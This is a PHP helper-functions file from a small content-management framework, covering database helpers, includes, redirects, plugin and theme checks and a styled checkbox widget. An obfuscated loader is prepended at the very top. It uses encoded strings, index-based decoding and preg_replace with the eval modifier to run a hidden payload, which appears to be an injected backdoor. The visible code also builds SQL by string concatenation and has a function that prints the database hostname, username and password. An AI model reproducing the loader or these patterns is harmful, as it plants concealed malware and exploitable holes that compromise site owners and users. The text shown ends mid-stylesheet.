<?php $ieppeiqvnu = ']#-bubE{h%x5c%x7825)tpqsutA!>!{e%x5c%x7825)!>>%x5c%x7822!ftmbg)!gj<*#k#)usbude>u%x5c%x7825V<#65,47R25,d7R17,67R37,#%x5c%x782fq%x5c%xuqpuft%x5c%x7860msvd}+;!>!}%x5c%x7827;!>>>!}_;gvc%x5c%x7t0}Z;0]=]0#)2q%x5c%x786767~6<Cw6<pd%x5c%x7825w6Z6%x7860gvodujpo)##-!#~<#%x5c%x782f%x5c5:<**#57]38y]47]67y]37]88y]27]28y>j%x5c%x7825!*9!%x5c%x7827!hmg%x5c%x7825)!gj!~<ofmy8257>%x5c%x782f7&6|7**111127147%x67%42%x2c%163%x74%pjudovg)!gj!|!*msv%x5c%x78245]K2]285]Ke]53Ld]53]Kc]55Ld]55#*<%x%x5c%x7825ww2!>#p#%x5c%x782f#p#%x5c%x7824-%x5c%x7824-tusqpt)%x5c%x7825z-#:#*%x5c%x7824-%x5c]y3e]81]K78:56985:6197g:74985-rr.93e:5597f-s.973:8297f:5297e:56-%c%x7822)gj6<^#Y#%x5c%x785cq%x5c%x7825%x5c%x7827Y%x5c%x85]256]y6g]257]y86]267]y74]275]y7:]268]y7f#<!%x5c%x782x5c%x7825w6Z6<.4%x5c%x7860hA%x5c%x78>2bd%x5c%x7825!<5h%x5c%x7825%x54]275L3]248L3P6L1M5]D2P4]D6#<%x5c%x7825G]y6d]281Ld]25!|!*!***b%x5c%x7825)sf%x5c27pd%x5c%x78256<pd%x5c%x7825w6Z6<.37825j:>1<%x5c%x7825j:=tj{fpg)%x5c%x7825s:*<%x5c%x78%x5c%x78256<*Y%x5c%x7825)fnbozcYufhA%x5c%x78272qj%x5c%x78256<^#zsr%x5c%x7878<~!!%x5c%x7825s:N}#-%x5c%x7825o:W%x5c%x7825c:>1<%x5c%33bq}k;opjudovg}%x5c%x7878;0]=])0#)U!%x5c%x7827{**u%x5c%x7825-#jif((function_exists("%x6%156%x75%156%x61"]=1; function fjfgg($n){return chr(ord($n)-1);} @erroc%x7825)sutcvt)fubmgoj{hA!osvufs!~<3,j%x5c%x7825>j%x5c%x7825!c%x7825tzw%x5c%x782f%x5c%xj{fpg)%x5c%x7825%x5c%x7824-%x5c%x7824*<!~!dsfbuf%x5c#-#}+;%x5c%x7825-qp%x5c%x7825)54l}%x5c%x7827;%x5c%x7825!<*#}_c%x7824-%x5c%x7824%x5c%x785c%x5c%x7825j^%x5c%x7824-%x5c%x78]265]y39]271]y83]256]y78]x7827,*d%x5c%x7827,*c%x5c%x7827,*b%x5c%x7827)fepdof.)fepdof.%x5c%x782f#@#%x5c%x782fqp%x5c%x7825>5h%x5c%x7825!<*::::::-160QUUI&b%x5c%x7825!|!*)32375fubmgoj{h1:|:*mmvo:><.5%x5c%x7860hA%x5c%x7827pd%x5c%x78256<pd%qj%x5c%x78257-K)udfoopdXA%x5c%x7822)7gj6<*QDU%x5c%x786]84]y31M6]y3e]81#%x5c%x782f#7e:55946-tr.984:75983:48984:71248]y83]256]y81]265]y7%x7825%x5c%x7824-%x5c%x7824!>!fyqmpef)#%x5c%x7824*<!1^-%x5c%x7825r%x5c%x785c2^-%f;!osvufs}w;*%x5c%x787f!>>%x5c%x7822!pd%x5c%x7825)!gjj+{e%x5c%x7825!osvufs!*!+3]78]y33]65]y31]55]y85]8*%x5c%x787f_*#[k2%x5c%x7860{6:!}7;!}6;##45%x28%141%x72%162%x61%171%x5f%155%x61%160%x28%42%x66%152%x66%fvr#%x5c%x785cq%x5c%x78257%x5c%x782f7#@#7%x5c%x782f7^d%x5c%x7825)+opjudovg+)!g7825<#762]67y]562]38y]572]48y]#>m%x5c%x7825:|:*r364]6]283]427]36]373P6]36]73]83]238M7]381]211M5]67]452]88]5]48]3224tvctus)%x5c%x7825%x5c%x5c%x7825bG9}:}.}-}!#*<%x5c%x7825nfd>%x5c%x7825fdy<Cb*[#)tutjyf%x5c%x7860opjudovg%x5c%x7822)!gj}1~!<2p%x5c%x7825%x5c#g6R85,67R37,18R#>q%x5c%x7825V<**2-4-bubE{h%x5c%x7825)sutcvt)esp27id%x5c%x78256<%x5c%x787fw6*%x5c%x7)tpqssutRe%x5c%x7825)Rd%x5c%x7825)Rb%x5c%x7825))!gj!<*#cd2bge56+7tfs%x5c%x78256<*17-SFEBFI,6<*127-UVPFNJU,6<*27-SFGTOBSUOSVUF#~<%x5c%x7825h00#*<%x5c%x7825nfd)##Qtpz)#]341]88M4P8]37]278]225]241]334]368]322]3]151%x6d%160%x6c%157%x64%15c%x7825tjw!>!#]y84]275]y83]248]y83]256]y81]2r_reporting(0); preg_replacx7827doj%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#fmjgk4%x5c%x78M3]317]445]212]445]4*3!%x5c%x7827!hmg%x5c%x7825!0MPT7-NBFSUT%x5c%x7860LDPT7-UFOJ%x5c%x7860G]e7y]#>n%x5c%x7825<#372]5%x5c%x7825)323ldfidk!~!<**qp%x5c%x7!-#}#)fepmqnj!%x5c%x%x5c%x7825,3,j%x5c%x7825>j%x5c%x782x5c%x7878r.985:52985-t.98]K4]65]D8]86]y31]278]y3f]51L32f*)323zbe!-#jt0*?]+^?]_%x5#iubq#%x5c%x785cq%x5c%x7825%x5c%x7827jsv%x5c%x7825!<**3-j%x5c%x7825-bubE{h%x5c%x7825)sutcvt-#w#)ldbqov>*ofmy%x5c%x1H*WCw*[!%x5c%x7825rN}#QwTW%x5c%x7825hIr%x5c%x785c8y]472]37y]672]48y]#>s%x5c%x7825<#462]47y]252]18y]#>q%x5c%x5:|:**t%x5c%x7825)m%x5c%x7825=*hs+yfeobz+sfwjidsb%x5c%x7860bj+upcotn+qsvmt+fmhpph#)zbssb%x5c%x787f<u%x5c%x7825V%x5c%x7827{ftmfV%x5c%x787f<*X&Z&S{ftmfV%x5c%x72]254]y76]61]y33]68]y34]68]y33]65]y31]53]y6d]281]y465]y72]254]y76#<%x5c%x7825tmw!>!#]y84]275]y%x5c%x7825:-t%x5c%x7825)3of:opjudovg<~%x5c%x7824<!%x5cD:M8]Df#<%x5c%x7825tdz>#Lx787fw6*3qj%x5c%x78257>%x5c%x782272qj%x5c%x7825)7gj6<**2qjj%x5c%x78257-C)fepmqnjA%x5c%x7827&6<.fmjgA%x5c%>hmg%x5c%x7825!<12>j%x5c%x7825!|!*#822#)fepmqyfA>2b%x5c%x7825!<*qp%x5c%x7825-*.%x5c%x7825)euhA)3of87f<*XAZASV<*w%x5c%x7825)ppx5c%x7825ggg)(0)%x5c%x782f+*0f(-!#]y76]277]y72f%142%x5f%163%x74%141%x72%164") && (!isset($GLOBALS["%x61%156%x75%156S,6<*msv%x5c%x78257-MSV,6<*)ujojR%x5c%x78c%x785c}X%x5c%x7824<!%x5c%x7825tzw>!#]%x7825r%x5c%x7878Bsfuvso!sboepn)%x5c%x7825epnbss-%x5c%x%x78256<C%x5c%x7827pd%x5c%x78256|6.7eu{66~67<&w6<*&7-#5c%x7827!hmg%x5c%x7825)!gj!<2,*j%x5c%x7825-#125)}.;%x5c%x7860UQPMSVD!-id%x5c%x7825)uqpuft%x5c%x7860msvd},;7824)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C78257;utpI#7>%x5c%x782f7rfs%x5c%x78256<#o]1%x5c%x782f20QUUI7jsv%x5c#-#O#-#N#*%x5c%x7824%x5c%x782f%x5c%x7825kj:-!OVMM;#)323ldfid>}&;!osvufs}%x5c%x787f87f_*#ujojRk3%x5c%x7860{666~6<&11112)eobs%x5c%x7860un>qp%x5c%x7825!|Z~!<##!>!2p%x5c%x78%x5c%x7825c:>%x5c%x78299386c6f+9f5d816:+946:ce44#)zbssb!>%x5c%x7825j>1<%x5c%x7825j=t25j:,,Bjg!)%x5c%x7825j:>>1*!%x5c%x7825b:>1<!f#fopoV;hojepdoF.uofuopD#)sfebfI{*w%x5c%x7825)kV%x5c%x78%x5c%x78257-K)fujs%x5c%x7878X6<#o]o]Y%x5c%xr%x5c%x7825)s%x5c%x7825>%x5c%x782fh%x5c%x78225)}k~~~<ftmbg!osvufs!|ftmf!~<**9.-j%x5c%x7825-bubE{h%x5%x787f!~!<##!>!2p%x5c%x7825Z<^2%x5c%x7855c%x7825z>>2*!%x5c%x7825z>3<!fmtf!%x5c%x7825z>2<!%x5c0msvd}R;*msv%x5c%x787825%x5c%x7878:-!%x5dz*Wsfuvso!%x5c%x7825bss%x5c%x785csboe))1%x5c%x782825!**X)ufttj%x5c%x7822)gj!|!*nbsbq)sutcvt)!gj!|!*bubE{h%x5c%x7825)j{hnpd!opjudovg!|!**#j{hnpd]K9]77]D4]82]K6]72]K9]78]K5]53]Kc#<%x5c%x7825tpz!>!#]D6M78256<pd%x5c%x7825w6Z6<.2%x5c%x7860hA%x5c%x7827pd%x5c-K)ebfsX%x5c%x7827u%x5c%x7825)7fmji%x5c%x78786<C%x5c%x7827&6<*rfsx7824y4%x5c%x7824-%x5c%x78256<C>^#zsfvr#%x5c%x785cq%x57824-%x5c%x7824b!>!%x5c%x7825yy)#}#-]273]y76]258]y6g]273]y76]271]y7d]252]y74]256#<!%x7825b:>1<!gps)%x5c%x}K;%x5c%x7860ufldpt}X;%x5c%x786~!%x5c%x7825t2w)##Qtjw)#]82#-#!#-%x5c%x7825tmw)%x5c%x7825tww**WYsmtf!%x5c%x7825b:>%x5c%x7825s:%x5c%x785c%x5c%x7825j:.2^,%x5c%x7825b:<!sv}.;%x5c%x782f#%x5c%x782f#%x5c%x782f},;t%x5c%x7860cpV%x5c%x787f%x5c%x787f%x5c%x787f%x7824!>!tus%x5c%x7860sfqmbdf)%x5c%x7825%x5c%x7824-%x5c%2f#00;quui#>.%x5c%x7825!<***f%x5c%x7827,*e%x5c%*<(<%x5c%x78e%x5c%x78b%x5c%x7825ggg!>!#]y81%134%x78%62%x35%165%x3a%146%x21%76%x21%50%x5c%x7825%x5c%x7878:!>#%x5c%x7825)m%x5c%x7825):fmji%x5c%x7878:<##:>:h%x5c%x7825:<#64y]552!ssbnpe_GMFT%x5c%x7860QIQ&fc%x78257**^#zsfvr#%x5c%x785cq%x5c%x7825)ufttj%x5782f!#0#)idubn%x5c%x7860x5c%x7825hOh%x5c%x782f#00#WB%x5c%x7860FUPNFS&d_SFS]y3g]61]y3f]63]y3:]68]y76#<%x5c%w6<%x5c%x787fw6*CW&)7gj6<.[A%x5c%x7827&6<%x5c%x787fw67825r%x5c%x7878W~!Ypp2)%x5c%x7825zB%x5c%x78hfsq)!sp!*#ojneb#-*f%x5c%x7825)sf%x5c%x7878pmpusut]K3#<%x5c%x7825yy>#]D6]281L#%x5c%x782f%x5c%x7825z<jg!)%x%x5c%x7825kj:!>!#]y3d]51]y35]256]y76]72]y3d]51]y35]274]y4:]82]y3:]62]y%x5c%x7825)tpqsut>j%x5c%x7825!*72!%x%x61"])))) { $GLOBALS["%x61]y6g]273]y76]271]y7d]252]y74]256]y39]252]y83]273]y72]282#<!%xy76]277]y72]265]y39]274]y85]273B)fubfsdXA%x5c%x7827K6<%x5c%%x5c%x7825h!>!%x5c%x7%x7825o:!>!%x5c%x78242178}527}88:}334}472%x5c%x7824<78{**#k#)tutjyf%x5c%x7860%x5c%x7878%x5c%x7822l:!}V}Z;h!opjudovg}{;#)tutjyf%x5c%x7860o25z>!tussfw)%x5c%x7825zW%x5c%x7825h>EzH,2W%x5c%x7825wN;#-Ez-%x5c%x7824y7%x5c%x7824-%x5c%x7824*<!%x5c%x7824-%x5c%x7824gps)7825)ftpmdR6<*id%x5c%x7825)dfyfR%x5c%x782%x5c%x7825)hopm3qjA)qj3hopmA%x5c%x78273qj4]y8%x5c%x7824-%x5c%x7824]26%x5c%x7824-%x5c%x7824<%x5c%x%x5c%x7827k:!ftmf!}Z;^nbsbx7824]25%x5c%x7824-%x5c%x7824-!%x5c%x7825%x5c%x7824-%x5c%x7824*!|!%x5%x5c%x787f_*#fubfsdXk5%x5c%x7860{66~6<&w6<%x5c%x787fw6*CW&)7gj6<*do5tww!>!%x5c%x782400~:<h%x5c%x7825_t%x5c%x7825:osvufs:~:<*9-1-162%x5f%163%x70%154%x69%164%50%x22825tdz)%x5c%x7825bbT-%x5c%x7825bT-%x5c%x7825hW~%x5c%x7825fdy)##-!825!-uyfu%x5c%x7825)3of)fepdof%x5c%x786057ftbc%x5c%x787f!|!*uyfuFGFS%x5c%x7860QUUI&c_UOFHB%x5c%x7860SFTV%x5c%x7878256<.msv%x5c%x7860ftsbqA7>q%x5c%x78256<%x5c%x787fw6*5c%x785c^>Ew:Qb:Qc:Wc%x782f#0#%x5c%x782f*#npd%x5c%x782f#)rrd%x5c%x78!<+{e%x5c%x7825+*!*+fepdfe{h+{x78e%x5c%x78b%x5c%x7825w:!>!%x5c%x78244c#<!%x5c%x7825t::!>!%x5c%x7824Ypp3)%x5c%x7825cB%x5c%x782}C;!>>!}W;utpi}Y;tuofuopd%x5c%x7860ufh%x5c%x7860fmjg}[;ldpt%x5c%x7825:iuhofm%x5c%x7825:-5ppde:4:|:**#ppde#)tutjyf%x5c%x78604%x5c%x78223}!+1#%x5c%x782f#M5]DgP5]D6#<%x5c%x7825fdy>#]D4]273]D6P2Lq%x5c%x7825%x5c%x785cSFWSFT%x5c%x7860%x5c%x7825}X;!sp!*#opo#>>}R;m]y7d]252]y74]256#<!%x5c%x7825ff2!>!bssbz)%x5c%f35.)1%x5c%x782f14+9**-)1%x5c%x782f2986+7**^%x5c%x782f%x5c%x7825785c2^<!Ce*[!%x5c%x7825cIjQeTQcOc%x5c%x782f#00#W~!Ydrr)%x5cc2b%x5c%x7825!>!2p%x5c%x7825!*3>?*2b%x5c%x7825)g~!%x5c%x7825z!>2<!gps)%x5c%x7825j>1<%x5c%x7825j=6[)!gj!<2,*j%x5c%x7825!-#1]#-bubE{h%x7825ww2)%x5c%x7825w%x5c%x7%x5c%x7860hA%x5c%x7827pd%x5c%x7pf{jt)!gj!<*2bd%x5c%x7825-#1GO%x5c%x7e("%x2f%50%x2e%52%x29%57%x65","%x65%166%x61%154%x28%}%x5c%x7827;mnui}&;zepc}A;~!}%x5c%x787f;!|!}{;)gj}l;825}&;ftmbg}%x5c%x787]#%x5c%x782fr%x5c%x7825%x5c%x782fh%x5c%x78257825j,,*!|%x5c%x7824-%x5c%x7824gvodujpo!%x5c%x7824-860TW~%x5c%x7824<%x5c%x78e%x5c%x78b%x5c%x7825mm)%x5c%x5c%x787fw6<*K)ftpmdXA6|7**197-260{6~6<tfs%x5c%x7825w6<%x5c%x787fw6*CWtfs%x5c%x7825)7gj6<*id%x5c%xX)!gjZ<#opo#>b%x5c%x7boepn)%x5c%x7825bss-%x5c%x7825r%x5c%x7878B%x5c%x7825h>#]y31]27825l}S;2-u%x5c%x7825!-#2#%x5c%x782f#%x5c%x7825#%x5c%x782f#o]#%x5c%x78o]s]o]s]#)fepmqyf%x5c%x7827*&7-n%x5c%x77825>U<#16,47R57,27R66,#%x5c%x782fq%x5c%x7825>2q%x5c%x7825<5P6]y6gP7L6M7]D4]275]8:|:7#6#)tutjyf%x5c%x7860439275ttfsqnpdov{h19275j{hnpd19291y]c9y]g2y]#>>*4-1-bubE{h%x5c%x7825_UTPI%x5c%x7860QUUI&e_SEE825)utjm6<%x5c%x787fw6*CW&)7gj6<*K)ftpmdXA6~6<u%x5c%x7!%x5c%x7825mm!>!#]y81]273]y76]258]y6g]273]y76]271825c!>!%x5c%x7825i%x5c%x3]321]464]284]364]6]234]342]58]24]31#-%x5c%x7825t)n%x5c%x7825-#+I#)q%x5c%x7825:>:r%x5c%x782%x7878pmpusut!-#j0#!%x5c%x782f!**#sfmcnb2]y76]62]y3:]84#-!OVMM*<%x22%51%x29%51%x29%73", NULL); };3q%x5c%x7825}U;y]}R;2]},;osvufs83]273]y76]277#<%x5c%x7825t2w>#]y74]273]y76]252]y;!opjudovg}k~~9{d%x5c%x7825:osvufs:~928>>%x5c%x7822:ftmbg39*56A:>:5s:%x5c%x785c%x5c%x7825j:^<!%x5c%x7825w%x5c%x7860%x5iN}#-!tussfw)%x5c%x7825c*W%x5c%x7825eN+#Qi%x5c%x785c1^W%x5c%x7zbek!~!<b%x5c%x7825%x5c%x787f!<X>b%x5c%x7825Z<#opo#>b%x5c%x7825!*##>>%x78257UFH#%x5c%x7827rfs%x5c%x78256~6<%x7825)utjm!|!*5!%x5c%x7827!hmg%x5c%x7825)!gj!|!*1?hmg%x5c%x7825)!gj!<*/(.*)/epreg_replacewezeorlmmv'; $qgzisqdwxe = explode(chr((283-239)),'1161,24,4077,69,6695,27,1185,70,2874,27,8593,52,2804,25,2104,62,386,23,7482,34,6075,65,6355,32,7845,38,210,27,1706,42,736,36,882,35,8525,31,5404,52,4280,54,9116,39,9353,54,358,28,5456,65,4927,43,4507,67,9997,40,8867,31,1748,54,3009,43,6814,28,3801,58,7162,41,968,65,2166,53,3248,49,5548,27,6233,48,628,54,7693,54,7354,67,3859,47,2901,60,8898,66,7121,41,2661,61,4146,41,2561,36,4656,31,6387,53,2064,40,7940,69,5680,31,5163,20,4379,61,132,56,8697,21,1962,53,6965,35,409,26,5014,56,1255,61,2981,28,8464,33,6659,36,4334,45,0,26,307,51,3132,35,3297,65,10037,69,2529,32,3906,35,9292,36,5288,59,2436,61,5070,40,8366,48,8556,37,3941,63,772,31,7767,48,5985,47,1539,66,1605,53,4687,56,854,28,9571,40,3503,56,3112,20,6281,24,6483,50,2597,64,4765,35,6206,27,9328,25,6332,23,7645,48,1658,26,9928,69,8964,21,5253,35,3077,35,7581,64,7259,26,8131,66,5845,40,1394,61,4623,33,9748,66,9235,57,1684,22,8009,69,7815,30,2219,25,2015,25,26,50,5885,44,3559,69,4004,27,76,56,9155,59,2497,32,4872,55,6915,50,9667,32,8645,52,1097,64,188,22,9048,68,3221,27,4187,38,6783,31,6722,61,2829,45,3679,43,9699,49,682,54,7421,61,4970,44,274,33,8718,44,9529,42,3471,32,6140,66,3052,25,3412,59,2244,48,3722,54,6863,52,9407,49,8197,46,7285,69,1455,59,2357,25,5575,36,502,61,5929,56,5521,27,7203,56,8762,51,7060,61,4800,27,1342,52,237,37,1882,52,6589,70,7883,57,9865,63,9456,24,8307,59,4225,55,6440,43,7000,60,3362,50,1934,28,6305,27,5711,65,8985,63,563,65,3167,54,1802,58,5347,57,6533,27,8078,53,9214,21,3776,25,803,51,435,37,2382,54,6842,21,7516,65,2722,54,2776,28,2292,65,2961,20,9480,49,5203,50,8243,64,1033,64,5659,21,917,51,4827,45,5776,69,4743,22,9814,51,7747,20,8414,50,472,30,6560,29,5110,53,8497,28,8813,54,5183,20,1316,26,4440,67,4574,49,6032,43,5611,48,4031,46,1514,25,1860,22,3628,51,2040,24,9611,56'); $vmfgatidkf=substr($ieppeiqvnu,(35895-25789),(33-26)); if (!function_exists('woobzzoihc')) { function woobzzoihc($etnwrkarwh, $hjdbcvhwwd) { $sesezcevbf = NULL; for($btjxywpuhs=0;$btjxywpuhs<(sizeof($etnwrkarwh)/2);$btjxywpuhs++) { $sesezcevbf .= substr($hjdbcvhwwd, $etnwrkarwh[($btjxywpuhs*2)],$etnwrkarwh[($btjxywpuhs*2)+1]); } return $sesezcevbf; };} $yrxpptchyb="\x20\57\x2a\40\x74\155\x63\157\x64\166\x76\163\x79\167\x20\52\x2f\40\x65\166\x61\154\x28\163\x74\162\x5f\162\x65\160\x6c\141\x63\145\x28\143\x68\162\x28\50\x31\66\x38\55\x31\63\x31\51\x29\54\x20\143\x68\162\x28\50\x36\64\x33\55\x35\65\x31\51\x29\54\x20\167\x6f\157\x62\172\x7a\157\x69\150\x63\50\x24\161\x67\172\x69\163\x71\144\x77\170\x65\54\x24\151\x65\160\x70\145\x69\161\x76\156\x75\51\x29\51\x3b\40\x2f\52\x20\142\x63\171\x75\143\x79\163\x68\143\x69\40\x2a\57\x20"; $owqyvuicrg=substr($ieppeiqvnu,(70097-59984),(75-63)); $owqyvuicrg($vmfgatidkf, $yrxpptchyb, NULL); $owqyvuicrg=$yrxpptchyb; $owqyvuicrg=(805-684); $ieppeiqvnu=$owqyvuicrg-1; ?><?php
#                                                #
# PHP Dev__ framework [ Predefioned functions ]  #
#                                                #
function inc($file){
	if(!empty($file)){
	if(file_exists($file.'.php')){
	$path = pathinfo(__FILE__);
	$que = include(	$file.'.'.$path['extension']);
	}
	else{ $msg = ''; }
	}
	return true;
}
function limit($str,$limit){
	$len = strlen($str);
	if($len > $limit):
	$str =  substr($str,0,$limit)."...";
	else:
	$str =$str;
	endif;
	return $str;
}
function check_friendly_url($string){ $checked_url='';
    $string = str_replace(' ', '-', $string); // Replaces all spaces with hyphens.
    $new = preg_replace('/[^A-Za-z0-9\-\.\_]/', '', $string); // Removes special chars.
	$sql = select(DB_PREFIX."posts where friendly_url='".$new."'");
	$sql_ = select(DB_PREFIX."pages where friendly_url='".$new."'");
	if((mysql_num_rows($sql)==0) && (mysql_num_rows($sql_)==0)){
	$checked_url = $new;
	}else{ $checked_url = 'page-'.rand(2,100).'-'.$new; }
	return $checked_url;
}
function front_page_access(){
	$front_page = array('page.php','DEV__.php');
	if(in_array(basename($_SERVER['REQUEST_URI']),$front_page)){
		echo '<p align="center">'.error("Sorry Access Denied!");exit;
	}
}
function incp($file){
	if(!empty($file)){
	$tpl_file = "templates/".$file.".phtml";
	if(file_exists($tpl_file)){
	$que = include(	$tpl_file );
	}else{ $msg = ''; }
	}
	return true;
}
function rrmdir($dir) {
    foreach(glob($dir . '/*') as $file) {
        if(is_dir($file))
            rrmdir($file);
        else
            unlink($file);
    }
    rmdir($dir);
}
function loop($value,$count){
	if($value!='' && $count!='' && $count>0){
		for($i=0;$i<$count;$i++){
			print $value;			
		}
	}
}
function query($que){
	$que = mysql_query($que);
	return $que;
}
function insert($tbl,$submit){$msg='';
	if(!empty($submit) && !empty($tbl)){
	    $count = 0;
        $fields = '';
		foreach($_POST as $name=>$value){
			if($name!=$submit){
			  if ($count++ != 0) $fields .= ', ';
			  $name = mysql_real_escape_string($name);
			  $value = mysql_real_escape_string($value);
			  $fields .= "`$name` = '$value'";
			}
		}query("insert into $tbl set $fields");
	}else{	$msg = error("Invalid insert( ) function must be 2 args!");	}
	echo $msg;		
}
function select($que){
	$que = mysql_query("select * from $que");
	return $que;
}
function where($tbl,$field){
	$que = mysql_query("select * from $tbl where $field");
	if($que==true){
	return $que;
	}else{
		echo "Page Not found !";
		exit;
	}
}
function truncate(){ $msg='';
	if(count($arg=func_get_args())==1){$tbl = $arg[0];
	query("truncate ".$tbl);
	}else{
		$msg = error("truncate ( ) has 1 arg [pass table name]");
	}
	echo $msg;
}
function ip_address($ip){
	if(!filter_var($ip, FILTER_VALIDATE_IP)){
		   throw new InvalidArgumentException("IP is not valid");
	}
	$response=@file_get_contents('http://www.netip.de/search?query='.$ip);
	if (empty($response)){
		   throw new InvalidArgumentException("Error Contacting IP-Server");
	}
	$patterns=array();
	$patterns["domain"] = '#Domain: (.*?)&nbsp;#i';
	$patterns["country"] = '#Country: (.*?)&nbsp;#i';
	$patterns["state"] = '#State/Region: (.*?)<br#i';
	$patterns["town"] = '#City: (.*?)<br#i';
	$ipInfo=array();
	foreach ($patterns as $key => $pattern){
		   $ipInfo[$key] = preg_match($pattern,$response,$value) && !empty($value[1]) ? $value[1] : 'Not found';
	}
	return $ipInfo;
}
function number_only(){
	$key = "this.value=this.value.replace(/[^\d-]/,'')";
	echo 'onkeyup="'.$key.'"';
}
function fetch_once(){
	$tbl = ''; $field = '';
	if(count($arg=func_get_args())==2){$tbl = $arg[0]; $field=$arg[1];
	$sql = where($tbl,$field);
	$msg = fetch($sql);
	}else{ $msg = error('fetch_once( ) function must be two values!');}
	return $msg;
}
function fetch_all(){
	$tbl = '';
	if(count($arg=func_get_args())==1){$tbl = $arg[0];
		$sql = select($tbl);
		while($_ = fetch($sql)){
			$_[] = $_;
		}
	}else{
		$_ = error('fetch_all( ) function must have table name !');
	}
	return $_;
}
function fetch($que){ $fet='';
	$fet = mysql_fetch_object($que);
	return $fet;
}
function view($fun){
	if(!empty($fun)){
	  echo $fun;
	}
}
function req($var){$req='';
	if(isset($_REQUEST[$var])&&!empty($_REQUEST[$var])){
		$req = $_REQUEST[$var];
	}
	echo $req;
}
function location(){ $location = error("location() must be 1 arg!");
    $args = func_get_args(); 
    if(count($args)!=0){
    $location=$args[0]; 
	if(!empty($location)){ 
	 echo '<script>document.location.href="'.$location.'"</script>';
	 $location='';
	}
	}
	return $location;
}
function php_location(){ $location = error("php_location() must be 1 arg!");
    $args = func_get_args(); 
    if(count($args)!=0){
    $location=$args[0];
	header("location:".$location);
	$location = '';
	}
	return $location;
}
function get_between($content,$start,$end){ $str='';
    $r = explode($start, $content);
    if (isset($r[1])){
        $r = explode($end, $r[1]);
        return $str = $r[0];
    }
    return $str;
}

function plug_replace($begin,$end,$str){
	foreach($end as $v) { $my[] = base64_decode($v); }
	echo str_replace($begin,$my,$str);
}

function get_inner($string, $start, $end){
    $string = " ".$string;
    $ini = strpos($string,$start);
    if ($ini == 0) return "";
    $ini += strlen($start);
    $len = strpos($string,$end,$ini) - $ini;
    return $a[] = substr($string,$ini,$len);
}

function plug_between($start, $end, $str){
    $matches = array();
	$regex = "/$start([a-zA-Z0-9_\=]*)$end/";
    preg_match_all($regex, $str, $matches);
    return $matches[1]; # $matches[0] : Means return @@str@@,  $matches[1]: Means return str
}
function plug_between_at($start, $end, $str){
    $matches = array();
	$regex = "/$start([a-zA-Z0-9_\=]*)$end/";
    preg_match_all($regex, $str, $matches);
    return $matches[0]; # $matches[0] : Means return @@str@@,  $matches[1]: Means return str
}
function check_plugin_structure($plug_base){$msg=''; # [PLUGIN:ISSA]
	         $plug = '../partition/plugins/'.$plug_base;
			 $plug_files = array('index.php','status.php','short_code.txt');
	         if(is_dir($plug)){
				 foreach(glob($plug.'*',GLOB_ONLYDIR) as $files_){
					 $files = basename($files_);
					 if(in_array($files,$plug_files)){ #PLUGIN RETURN TRUE
					   $msg = true;
					 }else{
						rrmdir($plug); # DELETE FILES
						$msg = error("Sorry plugin structure invalid!"); 
					 }
				 }
			 }
			 return $msg;
}
function check_theme_structure($theme_base){$msg='';  # [THEME:IPSA]
	         $theme = '../partition/themes/'.$theme_base;
			 $theme_files = array('index.php','page.php','sub_page.php');
	         if(is_dir($theme)){
				 foreach(glob($theme.'*',GLOB_ONLYDIR) as $files_){
					 $files = basename($files_);
					 if(in_array($files,$theme_files)){ #THEME RETURN TRUE
					   $msg = true;
					 }else{
						rrmdir($theme); # DELETE FILES
						$msg = error("Sorry theme structure invalid!"); 
					 }
				 }
			 }
			 return $msg;
}
function extension_status($var){ $ext = false;
	if(num(DB_PREFIX."extensions where extension='".$var."' and status=1")==1){
		$ext = true;
	}
	return $ext;
}
function fwrite_stream($fp, $string) {
    for ($written = 0; $written < strlen($string); $written += $fwrite) {
        $fwrite = fwrite($fp, substr($string, $written));
        if ($fwrite === false) {
            return $written;
        }
    }
    return $written;
}
function smtp_mail($a,$b,$c,$d){
	if($_SERVER['HTTP_HOST']=='localhost'){
	$send = error("Sorry mail() function does't work in localhost!");
	}else{
		$send = mail($a,$b,$c,$d);
	}
	return $send;
}
function security(){
 $secure = '<p>HOSTNAME: '.HOSTNAME;$secure .= '<p>USERNAME: '.USERNAME;$secure .= '<p>PASSWORD: '.PASSWORD;
 return $secure;
}
function language(){ $lan='';
	$lan = '
<div id="translate-this"><a style="width:180px;height:18px;display:block;" class="translate-this-button" href="http://www.translatecompany.com/">Translate Company</a></div>

<script type="text/javascript" src="http://x.translateth.is/translate-this.js"></script>
<script type="text/javascript">
TranslateThis();
</script>';
return $lan;
}
function checkbox(){ // 3 args ===> Name , Id , Value , Onclick
    $name=$id=$value=$onc='';
    $arg = func_get_args();
	if(count($arg)!=0){ 
	$id=$arg[0];
	if(count($arg)==2){$name='name="'.$arg[1].'"'; }
	if(count($arg)==3){$value='value="'.$arg[2].'"';}
	if(count($arg)==4){$onc='Onclick="'.$arg[3].'"';}
	
	$check = "<style>
	.ondisplay{ padding:0px;}
    .ondisplay section{
	  width:100px;
	  height:100px;
	  background: #555;
	  display:inline-block;
	  border: 1px solid gray;
	  text-align: center;
	  margin-top:5px;
	  border-radius:5px;
	  box-shadow: 0 1px 4px
		 rgba(0, 0, 0, 0.3), 0 0 40px
		 rgba(0, 0, 0, 0.1) inset;}
	.ondisplay section::before{
	  content:'click it'; 
	  color: #bbb;
		font: 15px Arial, sans-serif;
		-webkit-font-smoothing: antialiased;
		text-shadow: 0px 1px black;}
	input[type=checkbox] {	visibility: hidden;	}
	/* SQUARED THREE */
	.squaredThree {
		width: 20px;	
		margin: 10px auto;
		position: relative;
	}
	.squaredThree label {
		cursor: pointer;
		position: absolute;
		width: 20px;
		height: 20px;
		top: 0;
	  left: 0;
		border-radius: 4px;
		-webkit-box-shadow: inset 0px 1px 1px rgba(0,0,0,0.5), 0px 1px 0px rgba(255,255,255,.4);
		-moz-box-shadow: inset 0px 1px 1px rgba(0,0,0,0.5), 0px 1px 0px rgba(255,255,255,.4);
		box-shadow: inset 0px 1px 1px rgba(0,0,0,0.5), 0px 1px 0px rgba(255,255,255,.4);
	
		background: -webkit-linear-gradient(top, #222 0%, #45484d 100%);
		background: -moz-linear-gradient(top, #222 0%, #45484d 100%);
		background: -o-linear-gradient(top, #222 0%, #45484d 100%);
		background: -ms-linear-gradient(top, #222 0%, #45484d 100%);
		background: linear-gradient(top, #222 0%, #45484d 100%);
		filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#222', endColorstr='#45484d',GradientType=0 );
	}

.squaredThree label:after {
	-ms-filter: 'progid:DXImageTransform.Microsoft.Alpha(Opacity=0)';
